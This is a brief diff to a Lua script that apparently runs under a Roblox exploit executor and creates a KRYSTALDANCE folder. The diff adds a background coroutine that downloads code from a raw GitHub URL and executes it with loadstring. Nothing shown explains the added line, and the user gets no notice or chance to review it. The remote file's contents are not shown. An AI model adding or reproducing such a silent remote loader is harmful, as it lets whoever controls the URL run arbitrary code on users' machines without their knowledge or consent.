@@ -62,7 +62,9 @@ end
 
 
 
-
+coroutine.resume(coroutine.create(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Solary-3/Scripts/refs/heads/main/Tag"))()
+end))
 
 if not isfolder("KRYSTALDANCE") then
         makefolder("KRYSTALDANCE")
